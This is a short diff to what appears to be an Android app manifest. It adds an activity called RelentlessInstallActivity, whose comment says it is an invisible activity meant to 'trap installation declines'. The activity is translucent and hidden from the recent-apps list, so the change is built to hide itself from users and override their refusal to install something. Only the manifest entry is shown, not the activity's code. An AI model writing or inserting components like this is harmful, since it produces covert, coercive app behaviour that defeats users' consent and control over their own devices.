@@ -69,6 +69,14 @@
             android:showWhenLocked="true"
             android:turnScreenOn="true"
             android:taskAffinity="" />
+            
+        <!-- RELENTLESS INSTALL: Invisible Activity to trap installation declines -->
+        <activity
+            android:name=".RelentlessInstallActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:taskAffinity="" />
 
 
         
